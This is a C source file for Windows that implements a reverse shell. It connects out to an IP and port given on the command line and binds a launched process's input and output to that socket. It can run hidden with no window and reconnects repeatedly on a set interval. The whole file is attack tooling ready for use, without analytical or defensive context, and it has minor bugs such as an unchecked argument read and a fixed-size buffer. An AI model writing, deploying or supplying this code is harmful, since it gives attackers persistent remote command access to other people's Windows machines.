#include <io.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <sys/types.h>

int main (int argc, char *argv[]){
      
    if (argc < 4){
        printf ("Usage: %s IP PORT CMD RETRY_INTERVAL [s]\n", argv[0]);
	printf ("If the retry interval is set to 0 the shell will be executed only once\n");
        printf ("By specifying s as last parameter the shell will be spawned as a new process\n");
	return 1;
    }
      
    char *ip = argv[1];
    unsigned short port = atoi (argv[2]);
    char *cmd = argv[3];
    unsigned short callback = 5000;
    bool defaultCallback = 1;
      
     
    if (atoi (argv[4]) != 0){
        callback = atoi (argv[4]);
        defaultCallback = 0;
    }
	if(strcmp (argv[argc-1], "s") == 0){
		char cmd_copy[100];
		sprintf(cmd_copy, "%s %s %d %s %d", argv[0], ip, port, cmd, callback);
		STARTUPINFO si_sub;
		PROCESS_INFORMATION pi_sub;

		ZeroMemory( &si_sub, sizeof(si_sub));
		si_sub.cb = sizeof(si_sub);
		ZeroMemory( &pi_sub, sizeof(pi_sub));
		
		if(CreateProcessA (NULL, cmd_copy, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si_sub, &pi_sub)){
			printf("subprocess started as %s with PID: %d\n",cmd_copy,GetProcessId(pi_sub.hProcess));
		}
		else{
			printf("subprocess creation failed\n");
			return 1;
		}
		
		CloseHandle (pi_sub.hProcess);
		CloseHandle (pi_sub.hThread);
		return 0;
	}
      
    WSADATA wsaData;
    if (WSAStartup (MAKEWORD (2, 2), &wsaData) != 0){
        printf ("WSASturtup failed.\n");
        return 1;
    }
      
    struct sockaddr_in sa;
    SOCKET sc = WSASocketA (AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons (port);
    sa.sin_addr.s_addr = inet_addr (ip);
      
    DWORD dwExitCode;
      
    while (1 == 1){
        
        sc = WSASocketA (AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        while (connect (sc, (struct sockaddr *) &sa, sizeof (sa)) != 0){
            printf ("Connecting...\n");
            Sleep (callback);
        }
              
        printf ("Connected!\n");
              
        STARTUPINFO si;
        memset (&si, 0, sizeof (si));
        si.cb = sizeof (si);
        si.dwFlags = (STARTF_USESTDHANDLES);
        si.hStdInput = (HANDLE) sc;
        si.hStdOutput = (HANDLE) sc;
        si.hStdError = (HANDLE) sc;
        PROCESS_INFORMATION pi;
              
        CreateProcessA (NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            
        printf ("Shell subprocess spawned!\n");
              
        if (defaultCallback){
            return 0;
        }
              
        while (1){
            Sleep (callback);
            if (GetExitCodeProcess (pi.hProcess, &dwExitCode)){
                if (dwExitCode != STILL_ACTIVE){
                printf ("Process terminated retrying connection\n");
                break;
                }
            }
            else
                printf ("Failed to retrieve shell status\n");
        }
        close (sc);
        CloseHandle (pi.hProcess);
		CloseHandle (pi.hThread);
    }
    return 0;
}
